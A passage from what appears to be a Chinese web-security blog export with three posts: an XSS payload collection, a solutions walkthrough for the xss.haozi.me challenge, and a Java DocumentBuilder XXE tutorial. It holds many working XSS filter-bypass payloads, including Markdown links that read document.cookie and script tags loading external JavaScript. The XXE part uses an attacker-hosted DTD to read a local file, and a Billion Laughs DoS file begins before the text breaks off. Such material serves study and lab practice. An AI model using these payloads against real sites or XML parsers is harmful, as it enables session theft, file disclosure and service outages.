onerror=alert(1)&gt;&lt;img/src=x onerror=alert(1)&gt;&lt;img src=1 alt=al lang=ert onerror=top[url=1]alt+lang[/url]&gt;// 下面的img标签都是在IE7以下版本生效&lt;img src=JaVaScRiPt:alert(1)&gt;&lt;img src=javascript:alert(String.fromCharCode(49))&gt;&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;img src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;&lt;img src=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;&lt;img src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;&lt;img src=\"jav ascript:alert('XSS')\"&gt; &lt;!-- 这里空格是tab --&gt;&lt;img src=\"jav&amp;#x09;ascript:alert('XSS');\"&gt; &lt;!-- &amp;#x09;是tab --&gt;&lt;img src=\"jav&amp;#x0D;ascript:alert('XSS');\"&gt; &lt;!-- &amp;#x0D;是回车 --&gt;&lt;img src=\" &amp;#14; javascript:alert('XSS');\"&gt;&lt;img DYNsrc=\"javascript:alert('XSS')\"&gt;&lt;img LOWsrc=\"javascript:alert('XSS')\"&gt;&lt;img src=`javascript:alert('xxxxx')`&gt;&lt;img src='vbscript:msgbox(\"XSS\")'&gt;&lt;input type=image src=x onerror=alert(1)&gt;&lt;input type=\"IMAGE\" src=\"javascript:alert('XSS');\"&gt; //IE7以下&lt;link rel=\"stylesheet\" href=\"javascript:alert('XSS');\"&gt; //IE7以下 &lt;meta http-equiv=\"refresh\" content=\"x;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&gt; //Firefox&lt;script&gt;alert(1)&lt;/script&gt;&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;&lt;sCrsCrIptIpt&gt;alalertert(1)&lt;/ScRsCrIptipt&gt;&lt;script&gt;\\u0061\\u006C\\u0065\\u0072\\u0074(1)&lt;/script&gt;&lt;script&gt;window[url=0]'alert'[/url]&lt;/script&gt;&lt;script&gt;parent[url=1]'alert'[/url]&lt;/script&gt;&lt;script&gt;self[url=2]'alert'[/url]&lt;/script&gt;&lt;script&gt;top[url=3]'alert'[/url]&lt;/script&gt;&lt;script src=http://www.xss.com/1.js&gt;&lt;/script&gt;[quote]&lt;/script&gt;\"&gt;'&gt;&lt;script&gt;alert(String.fromCharCode(49))&lt;/script&gt;&lt;&lt;SCRIPT&gt;alert(1);//&lt;&lt;/SCRIPT&gt;[/quote]&lt;style&gt;li&#123;list-style-image: url(\"javascript:alert('XSS')\");&#125;&lt;/style&gt;&lt;ul&gt;&lt;li&gt;XSS&lt;/br&gt; //IE7以下&lt;style&gt;a&#123;width:expression(alert('11'))&#125;&lt;/style&gt;&lt;a href=\"x\"&gt;&lt;/a&gt; //IE7以下&lt;style&gt;.xss&#123;background-image:url(\"javascript:alert('XSS')\");&#125;&lt;/style&gt;&lt;a class=xss&gt;&lt;/a&gt; //IE7以下&lt;style type=\"text/css\"&gt;BODY&#123;background:url(\"javascript:alert('XSS')\");&#125;&lt;/style&gt; //IE7以下&lt;svg/onload=alert(1)&gt;&lt;table BACKGROUND=\"javascript:alert('XSS')\"&gt; //IE7以下&lt;table&gt;&lt;TD BACKGROUND=\"javascript:alert('XSS')\"&gt; //IE7以下&lt;div style=\"background-image: url(javascript:alert('XSS'));\"&gt; //IE7以下 MarkDown XSS Payload杂烩1234567891011121314151617181920212223242526272829303132[a](javascript:prompt(document.cookie))[a](j a v a s c r i p t:prompt(document.cookie))![a](javascript:prompt(document.cookie))\\&lt;javascript:prompt(document.cookie)&gt;&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\\[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)[a](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)![a'\"`onerror=prompt(document.cookie)](x)\\[citelol]: (javascript:prompt(document.cookie))[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)[test](javascript://%0d%0aprompt(1))[test](javascript://%0d%0aprompt(1);com)[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)[notmalicious](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)[clickme](vbscript:alert(document.domain))_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//&lt;http://\\&lt;meta\\ http-equiv=\\\"refresh\\\"\\ content=\\\"0;\\ url=http://danlec.com/\\\"\\&gt;&gt;[text](http://danlec.com \" [@danlec](/danlec) \")[a](javascript:this;alert(1))[a](javascript:this;alert(1&amp;#41;)[a](javascript&amp;#58this;alert(1&amp;#41;)[a](Javas&amp;#99;ript:alert(1&amp;#41;)[a](Javas%26%2399;ript:alert(1&amp;#41;)[a](javascript:alert&amp;#65534;(1&amp;#41;)[a](javascript:confirm(1)[a](javascript://www.google.com%0Aprompt(1))[a](javascript://%0d%0aconfirm(1);com)[a](javascript:window.onerror=confirm;throw%201)[a]([为了搜索成功，这里为0x01不可见字符，不包括中括号]javascript:alert(document.domain&amp;#41;)&lt;/http://&lt;?php\\&gt;&lt;\\h1\\&gt;&lt;script:script&gt;confirm(2) 参考xss绕过，payload全集 一些xss的pyload Me7ell","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"XSS闯关之xss.haozi.me","date":"2019-02-15T15:29:40.000Z","path":"2019/02/15/XSS闯关之xss-haozi-me/","text":"背景这里写下haozi大佬的XSS闯关练习笔记。 题目网址为：https://xss.haozi.me/ 项目地址为：https://github.com/haozi/xss-demo 注意这里有一个自带alert(1)的js地址：https://xss.haozi.me/j.js。 0x00关键源码： 123function render (input) &#123; return '&lt;div&gt;' + input + '&lt;/div&gt;'&#125; 无任何过滤直接往div标签内写内容，直接上payload即可。下面将本次用到的XSS payload小结如下： 1234567891011121314&lt;script&gt;alert(1)&lt;/script&gt;&lt;body onload=alert(1)&gt;&lt;body/onload=alert(1)&gt;&lt;svg onload=alert(1)&gt;&lt;svg/onload=alert(1)&gt;&lt;img src onerror=alert(1)&gt;&lt;input type=image src onerror=alert(1)&gt;&lt;script src=\"https://xss.haozi.me/j.js\"&gt;&lt;/script&gt;//加载外部js&lt;input type=button onclick=\"alert(1)\"&gt;//点击按钮&lt;input onmouseover=alert(1)&gt;//鼠标指针移动到指定的元素上时执行&lt;input onmousemove=alert(1)&gt;//鼠标移动时执行......还有其他onmouse系列&lt;img src=javascript: onmouseover=\"alert(1)\"&gt;//鼠标移动指向图片&lt;img src=javascript: onclick=\"alert(1)\"&gt;//鼠标点击图片 0x01关键源码： 123function render (input) &#123; return '&lt;textarea&gt;' + input + '&lt;/textarea&gt;'&#125; 无任何过滤直接往textarea标签内写内容，直接写和上面一样的payload是不行的，因为该标签内被解析为文本内容，文本框是无法执行JS代码的，因此需要闭合该textarea标签： 1&lt;/textarea&gt;&lt;svg onload=alert(1)&gt; 0x02关键源码： 123function render (input) &#123; return '&lt;input type=\"name\" value=\"' + input + '\"&gt;'&#125; 简单的DOM型XSS，无任何过滤直接往input标签内的value属性写内容，闭合掉双引号和大于号即可： 1\"&gt;&lt;body onload=alert(1)&gt; 也可以如下构造，当鼠标指向input输入框时就会执行弹框： 1\" onmouseover=\"alert(1) 0x03关键源码： 12345function render (input) &#123; const stripBracketsRe = /[()]/g input = input.replace(stripBracketsRe, '') return input&#125; 正则过滤了[]、()等符号，那就用反引号`来替代()： 1&lt;img src=x onerror=alert`1`&gt; 当然在标签属性内也可以使用HTML实体编码绕过： 1&lt;img src=\"\" onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt; 直接引用外部js文件同样OK： 1&lt;script src=\"https://xss.haozi.me/j.js\"&gt;&lt;/script&gt; 0x04关键源码： 12345function render (input) &#123; const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, '') return input&#125; 在上一题的基础上，添加了反引号`的过滤，但前面的后两个payload是可以用的： 12&lt;img src=\"\" onerror=alert&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;script src=\"https://xss.haozi.me/j.js\"&gt;&lt;/script&gt; 当然还有下面一些payload，同样都是利用编码绕过，只是标签不同而已： 123&lt;script&gt;window.onerror=eval;throw'=alert\\x281\\x29'&lt;/script&gt;//利用js捕获抛出错误执行弹框，Unicode编码&lt;iframe srcdoc=\"&lt;script&gt;parent.alert&amp;#40;1&amp;#41;&lt;/script&gt;\"&gt;//利用HTML5中iframe的特点，其srcdoc属性里的代码会作为iframe中的内容显示出来，srcdoc中可以直接去写转译后的HTML片段&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41&lt;/script&gt;//svg标签可直接执行实体字符即HTML转义字符，若不添加在前则包含解析script标签内容的编码内容 0x05关键源码： 1234function render (input) &#123; input = input.replace(/--&gt;/g, '😂') return '&lt;!-- ' + input + ' --&gt;'&#125; 过滤了–&gt;，并将输入放入注释中间。但是， HTML注释支持以下两种方式： &lt;!-- xxx --&gt; &lt;!- xxx -!&gt; &lt;!— 以！开头，以！结尾对称注释的方式 —!&gt; 直接如下绕过： 1--!&gt;&lt;body/onload=alert(1)&gt; 0x06关键源码： 1234function render (input) &#123; input = input.replace(/auto|on.*=|&gt;/ig, '_') return `&lt;input value=1 $&#123;input&#125; type=\"text\"&gt;`&#125; 过滤了auto、大于号&gt;、以on开头=等号结尾，将其替换成_，且忽略大小写。但是没有过滤换行，直接可以换行绕过。 这里利用input标签的onmouse系列属性弹框即可： 12onmousemove=alert(1) 另外，input标签的type属性可以设置为image，然后利用类似img标签的套路来弹框即可： 12type=\"image\" src=\"\" onerror=alert(1) 0x07关键源码： 123456function render (input) &#123; const stripTagsRe = /&lt;\\/?[^&gt;]+&gt;/gi input = input.replace(stripTagsRe, '') return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`&#125; 正则过滤了&lt;&gt;括起来的字符串内容，这里可以利用容错性，少添加最后一个大于号&gt;也是可以执行的： 1&lt;body/onload=alert(1)// 当然，”//“可以替换为”&lt;!–”或空格或回车。 0x08关键源码： 12345678function render (src) &#123; src = src.replace(/&lt;\\/style&gt;/ig, '/* \\u574F\\u4EBA */') return ` &lt;style&gt; $&#123;src&#125; &lt;/style&gt; `&#125; 正则过滤了想要闭合用的style标签，且忽略大小写。和前面的一样，我们可以在标签的大于号&gt;之前添加空格或换行来绕过执行： 1&lt;/style &gt;&lt;body/onload=alert(1)&gt; 0x09关键源码： 1234567function render (input) &#123; let domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ if (domainRe.test(input)) &#123; return `&lt;script src=\"$&#123;input&#125;\"&gt;&lt;/script&gt;` &#125; return 'Invalid URL'&#125; 正则限制了必须以指定的域名来开头，并放置在script标签的src属性中。这里直接闭合双引号和script标签即可： 12https://www.segmentfault.com\"&gt;&lt;/script&gt;&lt;script src=\"https://xss.haozi.me/j.js 0x0A关键源码： 12345678910111213141516function render (input) &#123; function escapeHtml(s) &#123; return s.replace(/&amp;/g, '&amp;amp;') .replace(/'/g, '&amp;#39;') .replace(/\"/g, '&amp;quot;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;') .replace(/\\//g, '&amp;#x2f') &#125; const domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ if (domainRe.test(input)) &#123; return `&lt;script src=\"$&#123;escapeHtml(input)&#125;\"&gt;&lt;/script&gt;` &#125; return 'Invalid URL'&#125; 在上一题的基础上，过滤了&amp;、’、”、&lt;&gt;、/等字符。也就是说，不能通过闭合的形式构造payload执行了。 这里可以利用URL的@字符的特性来调用外部j.js。 一般的，当我们访问http://a.com@b.com 实际是访问http://b.com 虽然URL中的特殊符号会被过滤，但过滤后的HTML实体编码在HTML标签属性值中无影响，可以直接解析执行： 1https://www.segmentfault.com@xss.haozi.me/j.js 但是我这里是没有成功执行的，原因待确定。 0x0B关键源码： 1234function render (input) &#123; input = input.toUpperCase() return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`&#125; 将输入的字母全部转换成大写形式就直接传入h1标签中。 有几个tips： html标签大小写无影响； js严格区分大小写。 也就是说，不能直接构造js代码执行了，但这里可以利用script标签加载j.js，因为URL地址不受大小写影响且HTML标签不受大小写影响： 1&lt;script src=\"https://xss.haozi.me/j.js\"&gt;&lt;/script&gt; 0x0C关键源码： 12345function render (input) &#123; input = input.replace(/script/ig, '') input = input.toUpperCase() return '&lt;h1&gt;' + input + '&lt;/h1&gt;'&#125; 在上一题的基础上，替换了script字符串为空，且忽略大小写。 我们可以内嵌script来绕过： 1&lt;scrscriptipt src=\"https://xss.haozi.me/j.js\"&gt;&lt;/scriscriptpt&gt; 0x0D关键源码： 12345678function render (input) &#123; input = input.replace(/[&lt;/\"']/g, '') return ` &lt;script&gt; // alert('$&#123;input&#125;') &lt;/script&gt; `&#125; 正则过滤了&lt;、/、”、’等字符为空，再将输入传入script标签中有注释符的alert()内。 先通过换行绕过注释符限制，用反引号`替换()，最后换行添加HTML注释 –&gt; 来注释掉后面的js代码（记住，在–&gt;前必须添加换行才会生效）： 123alert`1`;--&gt; 0x0E关键源码： 12345function render (input) &#123; input = input.replace(/&lt;([a-zA-Z])/g, '&lt;_$1') input = input.toUpperCase() return '&lt;h1&gt;' + input + '&lt;/h1&gt;'&#125; 正则过滤了以”&lt;”开头且紧接字母的字符串，将其在”&lt;”与字母中间添加下划线”_”。 这题需要解决两个问题：1. \\&lt;s被正则替换坏了； 2. 大写的js无法正常运行。 这个确实不会搞，到网上看了下wp，发现还有这么个东西：“ſ 古英语中的s的写法, 转成大写是正常的S”。 那就直接将之前payload的s替换成 ſ 即可： 1&lt;ſcript src=\"https://xss.haozi.me/j.js\"&gt;&lt;/script&gt; 0x0F关键源码： 1234567891011function render (input) &#123; function escapeHtml(s) &#123; return s.replace(/&amp;/g, '&amp;amp;') .replace(/'/g, '&amp;#39;') .replace(/\"/g, '&amp;quot;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;') .replace(/\\//g, '&amp;#x2f;') &#125; return `&lt;img src onerror=\"console.error('$&#123;escapeHtml(input)&#125;')\"&gt;`&#125; 正则对单双引号、&amp;、&lt;&gt;、/进行了HTML实体编码，再放置到img标签的onerror属性中。 但是，对HTML inline js转义就是做无用功，浏览器会先解析HTML，然后再解析js。 我们可以直接闭合前面的console.error()，添加;分号再注入alert语句即可： 1234');alert('1或');alert(1)--&gt; 0x10关键源码： 1234567function render (input) &#123; return `&lt;script&gt; window.data = $&#123;input&#125;&lt;/script&gt; `&#125; 直接将输入放置到script标签的window.data中。 可以在前面通过引号随意赋值给window.data，以分号结束该js语句，再注入alert语句即可： 1\"\";alert(1) 可以闭合掉script标签： 1&lt;/script&gt;&lt;script&gt;alert(1) 可以直接在window.data执行再赋值： 12345alert(1)或eval(alert(1))或eval(\"alert(1)\") 0x11关键源码： 123456789101112131415161718192021222324252627282930// from alf.nufunction render (s) &#123; function escapeJs (s) &#123; return String(s) .replace(/\\\\/g, '\\\\\\\\') .replace(/'/g, '\\\\\\'') .replace(/\"/g, '\\\\\"') .replace(/`/g, '\\\\`') .replace(/&lt;/g, '\\\\74') .replace(/&gt;/g, '\\\\76') .replace(/\\//g, '\\\\/') .replace(/\\n/g, '\\\\n') .replace(/\\r/g, '\\\\r') .replace(/\\t/g, '\\\\t') .replace(/\\f/g, '\\\\f') .replace(/\\v/g, '\\\\v') // .replace(/\\b/g, '\\\\b') .replace(/\\0/g, '\\\\0') &#125; s = escapeJs(s) return `&lt;script&gt; var url = 'javascript:console.log(\"$&#123;s&#125;\")' var a = document.createElement('a') a.href = url document.body.appendChild(a) a.click()&lt;/script&gt;`&#125; 很长的一段过滤，将反斜杠\\、单双引号、&lt;&gt;、反引号`、斜杠/、换行符\\n与\\r、tab符\\t、换页符\\f、垂直制表符\\v、空字符\\O都在其前面添加反斜杠\\进行转义，最后再放置到script标签中。 这里注意到console.log(&quot;${s}&quot;)，当我们输入双引号时，其实是输入\\“，然后刚刚的代码就变成console.log(&quot;\\&quot;&quot;)，这样输入的\\“前面的反斜杠\\直接放在双引号中被忽略掉了，起不到转义字符的作用，因此可以利用此直接构造： 12345\");alert(\"1或\");alert(1)//或\");alert(1);&lt;!-- 中间的payload虽然//被转义为了\\/\\/，但转义之后还是//，不影响注释效果。 0x12关键源码： 12345// from alf.nufunction escape (s) &#123; s = s.replace(/\"/g, '\\\\\"') return '&lt;script&gt;console.log(\"' + s + '\");&lt;/script&gt;'&#125; 正则过滤了双引号，将其替换为\\\\“，再将输入放置到script标的console.log()中。 测试一下发现，当我们输入\\“时，经过转义后为console.log(&quot;\\\\&quot;&quot;)，即将过滤时添加的转移符给转义了，从而绕过了转移符的转义功能，可构造如下payload： 123456\\\");alert(1)//或\\\");alert(1)--&gt;或\\\");alert(1)&lt;!-- 另外，由于解析HTML标签的优先级高于解析JS的优先级，因此也可以直接闭合标签： 1&lt;/script&gt;&lt;script&gt;alert(1)// 小结这次的练习多是针对正则的绕过，学到一些新姿势，推荐练习。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"XML注入之DocumentBuilder与XXE攻击防御","date":"2019-02-13T14:19:12.000Z","path":"2019/02/13/XML注入之DocumentBuilder/","text":"0x01 何为DocumentBuilderDocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。 0x02 常规用法Demo先定义一个user.xml，用于让DocumentBuilder来解析： 123456&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 解析代码： 123456789101112131415161718192021222324public class test &#123; public static void main(String[] args)&#123; File f = new File(\"user.xml\"); documentBuilder(f); &#125; public static void documentBuilder(File f)&#123; DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance(); try &#123; DocumentBuilder builder=factory.newDocumentBuilder(); //解析xml文档，先获取 Document doc=builder.parse(f); //通过user名字来获取dom节点 NodeList nodeList=doc.getElementsByTagName(\"user\"); Element e=(Element)nodeList.item(0); //获取值 System.out.println(\"姓名：\"+e.getElementsByTagName(\"name\").item(0).getFirstChild().getNodeValue()); System.out.println(\"性别：\"+e.getElementsByTagName(\"sex\").item(0).getFirstChild().getNodeValue()); System.out.println(\"年龄：\"+e.getElementsByTagName(\"age\").item(0).getFirstChild().getNodeValue()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 运行后，发现成功解析了user.xml的内容： 0x03 XML注入漏洞验证1、测试是否支持解析DTD：创建test.xml，内容如下，主要添加了DTD即DOCTYPE： 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 测试代码中将user.xml改为test.xml。 运行代码，效果和Demo一样，即说明支持解析DTD。 这里注意一点，当进行的是黑盒测试时，未返回Error不代表就是可以解析XML，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装。 2、测试是否支持解析普通实体：修改test.xml内容如下，主要添加ELEMENT： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo EMPTY&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 发现可以正常解析。 3、测试是否支持解析参数实体：修改test.xml内容如下，主要修改ELEMENT为ENTITY实体： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;&amp;foo;&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; 运行代码，发现可正常解析，且成功进行了XML实体注入： 4、测试是否支持解析外部实体：修改test.xml内容如下，主要修改为SYSTEM执行访问外部链接： 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;tea;&lt;/age&gt;&lt;/user&gt; 在攻击者的服务器（这里自己开启一个Web服务）的Web目录放置一个Mi1k7ea.dtd文件，内容如下，读取本地C盘中的win.ini配置文件（若在Linux下读取”file:///etc/passwd”会报错，因为这种攻击方式受到XML中禁止字符的限制）： 1&lt;!ENTITY tea SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; 运行代码，在攻击者服务器看到目标程序访问了其中的恶意DTD文件： 发现成功通过远程加载解析DTD文件读取了本地文件内容： 当然，外部实体还有另一种写法，如下： 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY % milk SYSTEM &quot;http://192.168.17.136:8000/Mi1k7ea.dtd&quot;&gt; %milk; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;age&gt;&amp;tea;&lt;/age&gt;&lt;/user&gt; 运行结果和上面是一样的。 至此，我们知道DocumentBuilder是存在XML注入风险的，并且在未设置有效防御措施的时候可支持解析外部实体，即可进行XML外部实体注入攻击(XXE)。 0x04 XXE攻击利用其实前面的测试过程已经是一些利用方式了，如读取本地敏感文件等，但是前提是该XML注入是有回显的。 这里示例测试一些常用的，其他的更详细的以后遇到再补充吧。 1、DoS攻击在Java中，XXE的DoS攻击只对低版本的JDK有效，而高版本的JDK会进行防御。 （2）Billion Laughs 攻击经典的用于DoS的xml文件样例如下，原理为构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中： 12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 